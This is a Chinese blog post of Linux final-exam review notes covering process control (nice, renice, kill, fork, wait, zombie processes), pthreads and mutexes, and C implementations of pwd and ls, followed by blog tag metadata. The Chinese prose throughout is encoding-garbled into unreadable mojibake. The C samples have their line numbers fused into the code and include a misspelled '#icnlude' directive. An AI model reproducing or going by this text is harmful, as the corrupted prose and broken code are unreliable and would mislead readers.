å‰å°æ–¹å¼å¯åŠ¨è¿›ç¨‹: æ‰“å¼€ç³»ç»Ÿç»ˆç«¯ï¼Œåœ¨ç»ˆç«¯çª—å£çš„å‘½ä»¤è¡Œæç¤ºç¬¦åè¾“å…¥Linuxå‘½ä»¤å¹¶æŒ‰å›è½¦é”®ï¼Œå°±ä»¥å‰å°æ–¹å¼å¯åŠ¨äº†ä¸€ä¸ªè¿›ç¨‹ã€‚ åå°æ–¹å¼å¯åŠ¨è¿›ç¨‹: åœ¨ç»ˆç«¯ä¸‹ï¼Œä»¥åå°æ–¹å¼å¯åŠ¨è¿›ç¨‹ï¼Œéœ€è¦åœ¨æ‰§è¡Œçš„å‘½ä»¤åé¢æ·»åŠ ä¸€ä¸ªâ€œ&amp;â€ç¬¦å· è¿›ç¨‹ä¼˜å…ˆçº§æ”¹å˜ æŸ¥çœ‹ç›®å‰è¿›ç¨‹çš„ä¼˜å…ˆçº§ï¼š ps â€“l æ”¹å˜è¿›ç¨‹ä¼˜å…ˆçº§çš„å‘½ä»¤â€”â€”niceå‘½ä»¤ ã€åŠŸèƒ½ã€‘åœ¨å¯åŠ¨è¿›ç¨‹æ—¶æŒ‡å®šè¯·æ±‚è¿›ç¨‹æ‰§è¡Œä¼˜å…ˆçº§ ã€æ ¼å¼ã€‘nice [é€‰é¡¹] å‘½ä»¤ ã€é€‰é¡¹ã€‘å¸¸ç”¨çš„ä¸€ä¸ªé€‰é¡¹æ˜¯â€œ-nâ€ï¼Œnå€¼å³ä¸ºNIçš„å€¼ï¼Œnå€¼çš„èŒƒå›´ä¸º-20â€”19ã€‚nå€¼è¶Šå°ä¼˜å…ˆçº§è¶Šé«˜ã€‚å³ï¼Œ-20ä»£è¡¨æœ€é«˜çš„NIä¼˜å…ˆçº§ï¼Œ19ä»£è¡¨æœ€ä½çš„NIä¼˜å…ˆçº§ã€‚å¦‚æœä¸åŠ è¯¥é€‰é¡¹ï¼Œé»˜è®¤NIå€¼ä¸º10ã€‚ ã€è¯´æ˜ã€‘é»˜è®¤æƒ…å†µä¸‹ï¼Œåªæœ‰rootç”¨æˆ·æ‰èƒ½æé«˜è¯·æ±‚è¿›ç¨‹çš„ä¼˜å…ˆçº§ï¼Œæ™®é€šç”¨æˆ·åªèƒ½é™ä½è¯·æ±‚è¿›ç¨‹çš„ä¼˜å…ˆçº§ reniceå‘½ä»¤ ã€åŠŸèƒ½ã€‘åœ¨è¿›ç¨‹æ‰§è¡Œæ—¶æ”¹å˜NIçš„å€¼ã€‚ ã€æ ¼å¼ã€‘renice [+/-n] [-g å‘½ä»¤åâ€¦] [-p è¿›ç¨‹æ ‡è¯†ç â€¦] [-u è¿›ç¨‹æ‰€æœ‰è€…â€¦] ã€è¯´æ˜ã€‘å¯ä»¥é€šè¿‡å‘½ä»¤åã€è¿›ç¨‹æ ‡è¯†ç ã€è¿›ç¨‹æ‰€æœ‰è€…åæŒ‡å®šè¦æ”¹å˜çš„è¿›ç¨‹çš„NIå€¼ killå‘½ä»¤ ã€åŠŸèƒ½ã€‘ç»ˆæ­¢è¿›ç¨‹ ã€æ ¼å¼ã€‘kill [-ä¿¡å·] PID ã€è¯´æ˜ã€‘killå‘½ä»¤ç”¨æ¥ç»ˆæ­¢è¿›ç¨‹ï¼Œå®é™…æ˜¯å‘æŒ‡å®šè¿›ç¨‹å‘é€ç‰¹å®šçš„ä¿¡å·ã€‚ä»è€Œä½¿è¯¥è¿›ç¨‹æ ¹æ®è¿™ä¸ªä¿¡å·æ‰§è¡Œç‰¹å®šçš„åŠ¨ä½œã€‚ä¿¡å·å¯ä»¥ç”¨ä¿¡å·åç§°ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä¿¡å·ç ã€‚ pstreeå‘½ä»¤ ã€åŠŸèƒ½ã€‘æ˜¾ç¤ºè¿›ç¨‹å®¶æ—æ ‘çš„ä¿¡æ¯ ã€æ ¼å¼ã€‘pstree [é€‰é¡¹] [è¿›ç¨‹PID/ç”¨æˆ·å] forkå‘½ä»¤: ä¸€ä¸ªè¿›ç¨‹è°ƒç”¨forkæ¥å¤åˆ¶è‡ªå·±ã€‚åˆ›å»ºå­è¿›ç¨‹åï¼Œçˆ¶ã€å­è¿›ç¨‹æ‰§è¡ŒåŒä¸€ä¸ªç¨‹åºï¼Œå­è¿›ç¨‹ç»§æ‰¿çˆ¶è¿›ç¨‹çš„èµ„æºã€‚è°ƒç”¨forkï¼ˆï¼‰å‡½æ•°åï¼Œç³»ç»Ÿå°†åˆ›å»ºä¸€ä¸ªä¸å½“å‰è¿›ç¨‹ç›¸åŒçš„æ–°çš„è¿›ç¨‹ã€‚å®ƒä¸åŸæœ‰çš„è¿›ç¨‹å…·æœ‰ç›¸åŒçš„æ•°æ®ã€è¿æ¥å…³ç³»å’Œä»åŒä¸€å¤„æ‰§è¡Œçš„è¿ç»­æ€§ã€‚ 12345678910int main(){ printf(&quot;my pid is %d\\n&quot;, getpid() ); fork(); fork(); fork(); printf(&quot;my pid is %d\\n&quot;, getpid() );}é—®é¢˜ï¼šç¨‹åºä¼šæœ‰å‡ è¡Œè¾“å‡ºï¼Ÿ åˆ†è¾¨å­è¿›ç¨‹è¿˜æ˜¯çˆ¶è¿›ç¨‹ 12345678910111213int main(){ int fork_rv; printf(&quot;Before: my pid is %d\\n&quot;, getpid()); fork_rv = fork(); /* create new process */ if ( fork_rv == -1 ) /* check for error */ perror(&quot;fork&quot;); else if ( fork_rv == 0 ) printf(&quot;I am the child. my pid=%d\\n&quot;, getpid()); else printf(&quot;I am the parent. my child is %d\\n&quot;, fork_rv);} çˆ¶è¿›ç¨‹å¦‚ä½•ç­‰å¾…å­è¿›ç¨‹çš„é€€å‡º Waitåšçš„ä¸¤ä»¶äº‹æƒ…ï¼š æš‚åœè°ƒç”¨å®ƒçš„è¿›ç¨‹ç›´åˆ°å­è¿›ç¨‹ç»“æŸ å–å¾—å­è¿›ç¨‹ç»“æŸæ—¶ä¼ ç»™exitçš„å€¼ è¿›ç¨‹ä¸€æ—¦è°ƒç”¨äº†waitï¼Œå°±ç«‹å³é˜»å¡è‡ªå·±ï¼Œç”±waitè‡ªåŠ¨åˆ†ææ˜¯å¦å½“å‰è¿›ç¨‹çš„æŸä¸ªå­è¿›ç¨‹å·²ç»é€€å‡ºï¼Œå¦‚æœè®©å®ƒæ‰¾åˆ°äº†è¿™æ ·ä¸€ä¸ªå·²ç»å˜æˆåƒµå°¸çš„å­è¿›ç¨‹ï¼Œwaitå°±ä¼šæ”¶é›†è¿™ä¸ªå­è¿›ç¨‹çš„ä¿¡æ¯ï¼Œå¹¶æŠŠå®ƒå½»åº•é”€æ¯åè¿”å›ï¼›å¦‚æœæ²¡æœ‰æ‰¾åˆ°è¿™æ ·ä¸€ä¸ªå­è¿›ç¨‹ï¼Œwaitå°±ä¼šä¸€ç›´é˜»å¡åœ¨è¿™é‡Œï¼Œç›´åˆ°æœ‰ä¸€ä¸ªå‡ºç°ä¸ºæ­¢ã€‚ åƒµå°¸è¿›ç¨‹ æ³¨æ„ï¼šåœ¨ä¸€ä¸ªè¿›ç¨‹è°ƒç”¨äº†exitä¹‹åï¼Œè¯¥è¿›ç¨‹å¹¶éé©¬ä¸Šå°±æ¶ˆå¤±æ‰ï¼Œè€Œæ˜¯ç•™ä¸‹ä¸€ä¸ªç§°ä¸ºåƒµå°¸è¿›ç¨‹ï¼ˆZombieï¼‰çš„æ•°æ®ç»“æ„ã€‚åœ¨Linuxè¿›ç¨‹çš„5ç§çŠ¶æ€ä¸­ï¼Œåƒµå°¸è¿›ç¨‹æ˜¯éå¸¸ç‰¹æ®Šçš„ä¸€ç§ï¼Œå®ƒå·²ç»æ”¾å¼ƒäº†å‡ ä¹æ‰€æœ‰å†…å­˜ç©ºé—´ï¼Œæ²¡æœ‰ä»»ä½•å¯æ‰§è¡Œä»£ç ï¼Œä¹Ÿä¸èƒ½è¢«è°ƒåº¦ï¼Œä»…ä»…åœ¨è¿›ç¨‹åˆ—è¡¨ä¸­ä¿ç•™ä¸€ä¸ªä½ç½®ï¼Œè®°è½½è¯¥è¿›ç¨‹çš„é€€å‡ºçŠ¶æ€ç­‰ä¿¡æ¯ä¾›å…¶ä»–è¿›ç¨‹æ”¶é›†ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œåƒµå°¸è¿›ç¨‹ä¸å†å æœ‰ä»»ä½•å†…å­˜ç©ºé—´ã€‚ å¦‚ä½•ç»“æŸåƒµå°¸è¿›ç¨‹ï¼Ÿ çˆ¶è¿›ç¨‹ä¸­ä½¿ç”¨waitå‡½æ•°ï¼Œæ”¶å°¸ã€‚ æŠŠçˆ¶è¿›ç¨‹æ€æ‰ã€‚çˆ¶è¿›ç¨‹æ­»åï¼Œåƒµå°¸è¿›ç¨‹æˆä¸ºâ€å­¤å„¿è¿›ç¨‹â€ï¼Œè¿‡ç»§ç»™1å·è¿›ç¨‹initï¼Œinitå§‹ç»ˆä¼šè´Ÿè´£æ¸…ç†åƒµå°¸è¿›ç¨‹ï¼å®ƒäº§ç”Ÿçš„æ‰€æœ‰åƒµå°¸è¿›ç¨‹ä¹Ÿè·Ÿç€æ¶ˆå¤±. wait() è¿›ç¨‹ä¸€æ—¦è°ƒç”¨äº†waitï¼Œå°±ç«‹å³é˜»å¡è‡ªå·±ï¼Œç”±waitè‡ªåŠ¨åˆ†ææ˜¯å¦å½“å‰è¿›ç¨‹çš„æŸä¸ªå­è¿›ç¨‹å·²ç»é€€å‡ºï¼Œå¦‚æœè®©å®ƒæ‰¾åˆ°äº†è¿™æ ·ä¸€ä¸ªå·²ç»å˜æˆåƒµå°¸çš„å­è¿›ç¨‹ï¼Œwaitå°±ä¼šæ”¶é›†è¿™ä¸ªå­è¿›ç¨‹çš„ä¿¡æ¯ï¼Œå¹¶æŠŠå®ƒå½»åº•é”€æ¯åè¿”å›ï¼›å¦‚æœæ²¡æœ‰æ‰¾åˆ°è¿™æ ·ä¸€ä¸ªå­è¿›ç¨‹ï¼Œwaitå°±ä¼šä¸€ç›´é˜»å¡åœ¨è¿™é‡Œï¼Œç›´åˆ°æœ‰ä¸€ä¸ªå‡ºç°ä¸ºæ­¢ã€‚ å‚æ•°statusç”¨æ¥ä¿å­˜è¢«æ”¶é›†è¿›ç¨‹é€€å‡ºæ—¶çš„ä¸€äº›çŠ¶æ€ï¼Œå®ƒæ˜¯ä¸€ä¸ªæŒ‡å‘intç±»å‹çš„æŒ‡é’ˆã€‚ä½†å¦‚æœæˆ‘ä»¬å¯¹è¿™ä¸ªå­è¿›ç¨‹æ˜¯å¦‚ä½•æ­»æ‰çš„æ¯«ä¸åœ¨æ„ï¼Œåªæƒ³æŠŠè¿™ä¸ªåƒµå°¸è¿›ç¨‹æ¶ˆç­æ‰ï¼Œï¼ˆäº‹å®ä¸Šç»å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éƒ½ä¼šè¿™æ ·æƒ³ï¼‰ï¼Œæˆ‘ä»¬å°±å¯ä»¥è®¾å®šè¿™ä¸ªå‚æ•°ä¸ºNULLï¼Œå°±è±¡ä¸‹é¢è¿™æ ·ï¼špid = wait(NULL); å¦‚æœæˆåŠŸï¼Œwaitä¼šè¿”å›è¢«æ”¶é›†çš„å­è¿›ç¨‹çš„è¿›ç¨‹IDï¼Œå¦‚æœè°ƒç”¨è¿›ç¨‹æ²¡æœ‰å­è¿›ç¨‹ï¼Œè°ƒç”¨å°±ä¼šå¤±è´¥ï¼Œæ­¤æ—¶waitè¿”å›-1 4.çº¿ç¨‹(é‡ç‚¹)çº¿ç¨‹æ˜¯æ“ä½œç³»ç»Ÿèƒ½å¤Ÿè¿›è¡Œè¿ç®—è°ƒåº¦çš„æœ€å°å•ä½ã€‚å®ƒè¢«åŒ…å«åœ¨è¿›ç¨‹ä¹‹ä¸­ï¼Œæ˜¯è¿›ç¨‹ä¸­çš„å®é™…è¿ä½œå•ä½ã€‚ ï¼ˆ1ï¼‰çº¿ç¨‹é‡‡ç”¨äº†å¤šä¸ªçº¿ç¨‹å¯å…±äº«èµ„æºçš„è®¾è®¡æ€æƒ³ã€‚åœ¨å¤šè¿›ç¨‹æƒ…å†µä¸‹ï¼Œæ¯ä¸ªè¿›ç¨‹éƒ½æœ‰è‡ªå·±ç‹¬ç«‹çš„åœ°å€ç©ºé—´ï¼Œåœ¨å¤šçº¿ç¨‹æƒ…å†µä¸‹ï¼ŒåŒä¸€è¿›ç¨‹å†…çš„çº¿ç¨‹å…±äº«è¿›ç¨‹çš„åœ°å€ç©ºé—´ã€‚çº¿ç¨‹å’Œè¿›ç¨‹çš„æœ€å¤§åŒºåˆ«åœ¨äºçº¿ç¨‹å®Œå…¨å…±äº«ç›¸åŒçš„åœ°å€ç©ºé—´ï¼Œè¿è¡Œåœ¨åŒä¸€åœ°å€ä¸Šã€‚ ï¼ˆ2ï¼‰ç”±äºè¿›ç¨‹åœ°å€ç©ºé—´ç‹¬ç«‹è€Œçº¿ç¨‹å…±äº«åœ°å€ç©ºé—´ï¼Œæ‰€ä»¥ä»ä¸€ä¸ªçº¿ç¨‹åˆ‡æ¢åˆ°å¦ä¸€çº¿ç¨‹æ‰€èŠ±è´¹çš„ä»£ä»·æ¯”è¿›ç¨‹ä½ã€‚ ï¼ˆ3ï¼‰è¿›ç¨‹æœ¬èº«çš„ä¿¡æ¯åœ¨å†…å­˜ä¸­å ç”¨çš„ç©ºé—´æ¯”çº¿ç¨‹å¤§ã€‚å› æ­¤ï¼Œçº¿ç¨‹æ›´èƒ½å……åˆ†åœ°åˆ©ç”¨å†…å­˜ã€‚çº¿ç¨‹å¯ä»¥çœ‹ä½œæ˜¯åœ¨è¿›ç¨‹å†…éƒ¨æ‰§è¡Œçš„æŒ‡å®šåºåˆ—ã€‚ ï¼ˆ4ï¼‰çº¿ç¨‹é—´çš„é€šä¿¡æ¯”è¿›ç¨‹é—´çš„é€šä¿¡æ›´åŠ æ–¹ä¾¿å’Œçœæ—¶ã€‚è¿›ç¨‹é—´çš„æ•°æ®ç©ºé—´ç›¸äº’ç‹¬ç«‹ï¼Œå½¼æ­¤é€šä¿¡è¦ä»¥ä¸“é—¨çš„é€šä¿¡æ–¹å¼è¿›è¡Œï¼Œé€šä¿¡æ—¶å¿…é¡»ç»è¿‡æ“ä½œç³»ç»Ÿï¼Œè€ŒåŒä¸€è¿›ç¨‹çš„å¤šä¸ªçº¿ç¨‹å…±äº«æ•°æ®ç©ºé—´ï¼Œä¸€ä¸ªçº¿ç¨‹çš„æ•°æ®å¯ä»¥ç›´æ¥æä¾›ç»™å…¶ä»–çº¿ç¨‹ä½¿ç”¨ï¼Œä¸å¿…è¿›è¿‡æ“ä½œç³»ç»Ÿã€‚ 12345678int pthread_create( pthread_t *restrict tidp, //æ–°åˆ›å»ºçš„çº¿ç¨‹IDæŒ‡å‘çš„å†…å­˜å•å…ƒã€‚ const pthread_attr_t *restrict attr, //çº¿ç¨‹å±æ€§ï¼Œé»˜è®¤ä¸ºNULL void *(*start_rtn)(void *), //æ–°åˆ›å»ºçš„çº¿ç¨‹ä»start_rtnå‡½æ•°çš„åœ°å€å¼€å§‹è¿è¡Œ void *restrict arg //é»˜è®¤ä¸ºNULLã€‚è‹¥ä¸Šè¿°å‡½æ•°éœ€è¦å‚æ•°ï¼Œå°†å‚æ•°æ”¾å…¥ç»“æ„ä¸­å¹¶å°†åœ°å€ä½œä¸ºargä¼ å…¥ã€‚ );â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”åŸæ–‡é“¾æ¥ï¼šhttps://blog.csdn.net/wushuomin/article/details/80051295 12345678910111213141516171819202122#include &lt;pthread.h&gt; // vital#include &lt;stdio.h&gt;#icnlude &lt;stdlib.h&gt;void print_msg(char *m){ int i; for(i=0 ; i&lt;NUM ; i++){ printf(&quot;%s&quot;, m); fflush(stdout); sleep(1); }}int main(){ pthread_t t1, t2; /* two threads */ void *print_msg(void *); pthread_create(&amp;t1, NULL, print_msg, (void *)&quot;hello&quot;); pthread_create(&amp;t2, NULL, print_msg, (void *)&quot;world\\n&quot;); pthread_join(t1, NULL); pthread_join(t2, NULL);} pthread_joinä½¿å¾—è°ƒç”¨çº¿ç¨‹æŒ‚èµ·ç›´è‡³æœ‰threadå‚æ•°æŒ‡å®šçš„çº¿ç¨‹ç»ˆæ­¢ã€‚ å¤šä¸ªçº¿ç¨‹åœ¨ä¸€ä¸ªå•ç‹¬çš„è¿›ç¨‹ä¸­è¿è¡Œï¼Œå…±äº«å…¨å±€å˜é‡ï¼Œå› æ­¤çº¿ç¨‹é—´å¯ä»¥é€šè¿‡è®¾ç½®å’Œè¯»å–å…¨å±€å˜é‡æ¥è¿›è¡Œé€šä¿¡ã€‚ å¯¹å…±äº«å†…å­˜çš„è®¿é—®æ˜¯çº¿ç¨‹çš„ä¸€ä¸ªæ—¢æœ‰ç”¨åˆæå…¶å±é™©çš„ç‰¹æ€§ pthread_mutex_lock pthread_mutex_unlock 12345pthread_mutex_t counter_lock = PTHREAD_MUTEX_INITIALIZER;pthread_mutex_lock(&amp;counter_lock);total_words++;pthread_mutex_unlock(&amp;counter_lock); 5.pwd1ã€å¦‚ä½•åˆ¤æ–­æ˜¯å¦åˆ°è¾¾ç›®å½•æ ‘çš„é¡¶ç‚¹ï¼Ÿ åœ¨unixæ–‡ä»¶ç³»ç»Ÿçš„æ ¹ç›®å½•ä¸­â€œ.â€å’Œâ€œ..â€æŒ‡å‘åŒä¸€ä¸ªi-èŠ‚ç‚¹æ—¶ï¼Œå°±ä»¥è®¤ä¸ºåˆ°è¾¾æ ‘çš„é¡¶ç«¯ã€‚ 2ã€å¦‚ä½•æ­£ç¡®æ˜¾ç¤ºç›®å½•åï¼Ÿ é€’å½’åœ°è°ƒç”¨å¹¶æ˜¾ç¤ºï¼Œæˆ–è€…ä½¿ç”¨æ ˆæ•°æ®ç»“æ„ï¼› å‘½ä»¤pwdçš„å®ç°æµç¨‹ å¾—åˆ°â€.â€çš„i-èŠ‚ç‚¹å·ï¼Œç§°å…¶ä¸ºn(ä½¿ç”¨stat)ï¼› chdir ..ï¼Œåˆ‡æ¢åˆ°ä¸Šä¸€çº§ç›®å½•( ä½¿ç”¨chdir)ï¼› æ‰¾åˆ°i-èŠ‚ç‚¹å·næ‰€å¯¹åº”çš„é“¾æ¥åç§°(ä½¿ç”¨opendir, readdir, closedirï¼‰ï¼Œé‡å¤ç›´åˆ°æ ‘çš„é¡¶ç«¯ï¼› 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061#include&lt;stdio.h&gt;#include&lt;sys/stat.h&gt;#include&lt;sys/types.h&gt;#include&lt;dirent.h&gt;#include&lt;stdlib.h&gt;#include&lt;string.h&gt;#define SIZE 128ino_t get_inode(char *dirname);void get_work_dir(ino_t inode_num);void inode_to_dirname(ino_t inode_num, char *buf, int buflen);int main(void){ get_work_dir(get_inode(&quot;.&quot;)); printf(&quot;\\n&quot;); return 0;}ino_t get_inode(char *dirname){ struct stat info; if (stat(dirname, &amp;info) == -1){ perror(&quot;dirname&quot;); exit(1); } return info.st_ino;}void get_work_dir(ino_t inode_num){ ino_t parent_inode; char buf[SIZE]; if (get_inode(&quot;..&quot;) != inode_num){ chdir(&quot;..&quot;); inode_to_dirname(inode_num, buf, SIZE); parent_inode = get_inode(&quot;.&quot;); get_work_dir(parent_inode); printf(&quot;/%s&quot;, buf); }}void inode_to_dirname(ino_t inode_num, char *buf,int buflen){ DIR *dir_ptr; struct dirent *dire; if ((dir_ptr = opendir(&quot;.&quot;)) == NULL){ perror(&quot;.&quot;); exit(1); } while ((dire = readdir(dir_ptr)) != NULL){ if (dire-&gt;d_ino == inode_num){ strncpy(buf, dire-&gt;d_name, buflen); buf[strlen(buf)] = '\\0'; closedir(dir_ptr); return ; } } fprintf(stderr, &quot;error looking for inode number %d\\n&quot;, (int)inode_num); exit(1);} 6.lsåœ¨Linuxä¸­æ–‡ä»¶å’Œç›®å½•éƒ½è¢«ç»„ç»‡ç›®å½•æ ‘ï¼Œæ¯ä¸ªèŠ‚ç‚¹æˆ–è€…æ˜¯æ–‡ä»¶æˆ–è€…æ˜¯ç›®å½•ï¼ŒUç›˜ç­‰ä¹Ÿæ˜¯æŒ‚è½½åˆ°æŸä¸ªç‰¹å®šçš„ç›®å½•ï¼Œæ‰€ä»¥lsåªè¦è€ƒè™‘è¿™ä¸¤ç§æƒ…å†µï¼Œä¸éœ€è¦å»è€ƒè™‘åˆ†åŒºã€‚ ç›®å½•æ˜¯ä¸€ç§ç‰¹æ®Šçš„æ–‡ä»¶ã€‚ æ‰“å¼€å½“å‰ç›®å½•çš„å¯¹åº”çš„dirpæ–‡ä»¶ï¼› DIR* dir_ptr = opendir(&quot;.&quot;); è¯»å–å½“å‰ç›®å½•çš„dir_ptrç»“æ„ä¸­çš„æ–‡ä»¶åï¼Œå¹¶æ‰“å°ï¼› direntp = readdir(dir_ptr) printf(&quot;%s\\n&quot;, direntrp-&gt;name); æœ€åå…³é—­æ‰“å¼€çš„dirpæ–‡ä»¶ï¼› é—®é¢˜ 1ã€æ€ä¹ˆæ ·æŠŠmodeï¼š100644è½¬åŒ–ä¸ºâ€-rw-râ€“râ€“â€ï¼Ÿ 2ã€user: 1000æ€ä¹ˆæ ·è½¬åŒ–ä¸ºtfzhangï¼Ÿ 3ã€group: 1000æ€ä¹ˆæ ·è½¬åŒ–ä¸ºtfzhangï¼Ÿ 4ã€å˜æ¢modtimeï¼Ÿ ä¸æ“ä½œæå–æ•°å­—ä½ é€šè¿‡æ¯ä½ä¸æ“ä½œï¼Œå°†æ¯ç»„çš„rwxä½æå–å‡ºæ¥ï¼›æ¯”å¦‚è¦æå–å³èµ·ç¬¬3ä½ï¼Œåªè¦å°†æ•°å€¼100644ä¸4è¿™ä¸ªæ•°è¿›è¡Œä¸æ“ä½œï¼› 7.catå¤ä¹ ä¸å®Œäº†ï¼Œ:cry: . è€ƒå®Œäº†ï¼Œè¿˜ç®—é¡ºåˆ©ï¼Œæ³¨æ„ä¸‹å„ç§å‡½æ•°çš„å‚æ•°ä½ç½®ï¼Œç€é‡å¤ä¹ çº¿ç¨‹ä¸è¿›ç¨‹è¿˜æœ‰pwdï¼Œcatï¼Œlsçš„å®ç°ï¼Œæ²¡äº†ï¼ŒæŒ‚ä¸äº†ã€‚","link":"/2021/06/24/linux%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/"}],"tags":[{"name":"DL EMA","slug":"DL-EMA","link":"/tags/DL-EMA/"},{"name":"CSAPP","slug":"CSAPP","link":"/tags/CSAPP/"},{"name":"computer-architecture","slug":"computer-architecture","link":"/tags/computer-architecture/"},{"name":"quote","slug":"quote","link":"/tags/quote/"},{"name":"Linux","slug":"Linux","link":"/tags/Linux/"},{"name":"æœŸæœ«å¤ä¹ ","slug":"æœŸæœ«å¤ä¹ ","link":"/tags/%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/"}],"categories":[{"name":"DL","slug":"DL","link":"/categories/DL/"},{"name":"computer architecture","slug":"computer-architecture","link":"/categories/computer-architecture/"},{"name":"Linux","slug":"Linux","link":"/categories/Linux/"}]}